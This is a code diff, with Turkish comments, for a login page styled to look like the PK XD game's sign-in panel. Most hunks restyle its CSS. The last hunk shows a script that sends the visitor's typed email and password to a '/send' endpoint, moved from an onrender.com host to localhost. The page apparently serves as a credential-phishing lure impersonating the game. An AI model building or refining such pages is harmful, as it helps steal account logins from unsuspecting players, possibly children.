@@ -16,6 +16,10 @@
 html, body{
   width:100%;
   height:100%;
+}
+
+/* ARKA PLAN */
+body{
   background: url("images/background.png") no-repeat center center fixed;
   background-size:cover;
 }
@@ -39,19 +43,32 @@ html, body{
   cursor:pointer;
 }
 
-/* LOGIN PANEL */
+/* =========================
+   PK XD LOGIN PANEL
+   ========================= */
 .login-panel{
   width:420px;
   margin:80px auto;
   padding:35px 30px 40px;
 
-  background:#6b2fd6;  /* MAT MOR */
+  /* TAM MAT MOR */
+  background:#6b2fd6;
+
+  /* PK XD FORM */
   border-radius:30px;
-  border:3px solid #36f3ff; /* CIRTLAK MAVİ */
-  box-shadow: 0 0 18px #36f3ff, 0 0 35px rgba(54,243,255,.8);
+
+  /* CIRTLAK MAVİ KENAR */
+  border:3px solid #36f3ff;
+
+  /* NEON KENAR IŞIĞI */
+  box-shadow:
+    0 0 18px #36f3ff,
+    0 0 35px rgba(54,243,255,.8);
+
   text-align:center;
 }
 
+/* LOGO */
 .logo-panel{
   width:130px;
   margin:0 auto 25px;
@@ -61,6 +78,7 @@ html, body{
   width:100%;
 }
 
+/* INPUTLAR */
 .login-panel input{
   width:100%;
   padding:16px;
@@ -79,6 +97,7 @@ html, body{
   box-shadow:0 0 12px #36f3ff;
 }
 
+/* ŞİFREMİ UNUTTUM */
 .forgot{
   text-align:right;
   color:#36f3ff;
@@ -87,6 +106,7 @@ html, body{
   cursor:pointer;
 }
 
+/* BUTON */
 button{
   width:100%;
   padding:16px;
@@ -103,9 +123,12 @@ button{
 button.active{
   opacity:1;
   cursor:pointer;
-  box-shadow: 0 0 18px #36f3ff, 0 0 40px rgba(54,243,255,.9);
+  box-shadow:
+    0 0 18px #36f3ff,
+    0 0 40px rgba(54,243,255,.9);
 }
 
+/* SONUÇ */
 .result{
   margin-top:18px;
   color:white;
@@ -188,9 +211,11 @@ loginBtn.addEventListener("click", async ()=>{
   if(loginBtn.disabled) return;
 
   try{
-    const res = await fetch("https://login-y0yd.onrender.com/send", {  // <--- BURASI DEĞİŞTİ
+    const res = await fetch("http://localhost:3000/send",{
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
         email: email.value,
         password: password.value
